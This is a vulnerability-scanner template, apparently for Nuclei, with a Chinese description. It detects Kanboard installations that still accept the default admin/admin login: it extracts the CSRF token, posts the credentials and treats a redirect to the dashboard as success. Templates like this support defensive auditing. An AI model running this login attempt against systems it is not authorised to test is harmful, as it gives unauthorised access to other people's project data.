id: kanboard-default-login

info:
  name: Kanboard 默认口令登录（弱口令）
  author: shelled
  severity: high
  description: 该模板通过尝试 Kanboard 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://twitter.com/0x_rood/status/1607068644634157059
    - https://github.com/kanboard/kanboard
    - https://docs.kanboard.org/v1/admin/installation/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:kanboard:kanboard:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    fofa-query: app="Kanboard"
    product: kanboard
    vendor: kanboard
  tags: default-login,kanboard,vuln

http:
  - raw:
      - |
        GET /?controller=AuthController&action=login HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /?controller=AuthController&action=check HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username={{user}}&password={{pass}}&csrf_token={{csrf_token}}

    attack: pitchfork
    payloads:
      user:
        - admin
      pass:
        - admin

    extractors:
      - type: regex
        name: csrf_token
        part: body
        group: 1
        regex:
          - "hidden\" name=\"csrf_token\" value=\"([0-9a-z]+)\""
        internal: true
    matchers:
      - type: dsl
        dsl:
          - contains(location, 'controller=DashboardController&action=show')
          - status_code == 302
        condition: and
